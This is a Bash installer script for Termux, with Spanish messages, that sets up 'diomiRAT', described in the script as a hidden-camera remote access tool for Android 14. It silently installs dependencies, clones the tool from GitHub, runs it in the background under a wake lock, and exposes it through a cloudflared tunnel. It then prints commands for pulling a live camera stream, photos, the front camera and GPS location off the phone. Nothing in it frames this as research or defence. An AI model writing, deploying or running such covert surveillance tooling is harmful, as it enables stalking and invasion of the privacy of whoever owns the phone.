#!/bin/bash
echo "Instalando/actualizando diomiRAT para Android 14 (cámara oculta)..."

# Actualizar paquetes
pkg update -y >/dev/null 2>&1
pkg upgrade -y >/dev/null 2>&1

# Instalar dependencias
pkg install python termux-api opencv-python ffmpeg cloudflared wget git -y >/dev/null 2>&1
pip install flask pillow >/dev/null 2>&1

# Clonar o actualizar repo
cd $HOME
if [ -d "diomiRAT" ]; then
    cd diomiRAT && git pull --quiet
else
    git clone https://github.com/Diomi1/diomiRAT.git >/dev/null 2>&1
    cd diomiRAT
fi

# Hacer ejecutable y matar procesos viejos
chmod +x quickrat.py
pkill -f quickrat.py >/dev/null 2>&1
pkill -f cloudflared >/dev/null 2>&1

# Mantener despierto y arrancar
termux-wake-lock >/dev/null 2>&1
sleep 2
nohup python quickrat.py > /dev/null 2>&1 &
nohup cloudflared tunnel --url http://localhost:5000 > tunnel.log 2>&1 &

# Esperar y mostrar enlace
sleep 10
echo ""
echo "¡DIOMIRAT activado! Enlace permanente (guárdalo):"
ENLACE=$(grep -o 'https://[^ ]*.trycloudflare.com' tunnel.log | head -1)
if [ -n "$ENLACE" ]; then
    echo "$ENLACE"
else
    echo "Revisa tunnel.log o espera 10s más."
fi
echo ""
echo "Comandos desde PC:"
echo "  Streaming: mpv $ENLACE/live"
echo "  Foto: curl $ENLACE/snapshot -o foto.jpg"
echo "  Frontal: curl $ENLACE/camera/1"
echo "  GPS: curl $ENLACE/location"
echo ""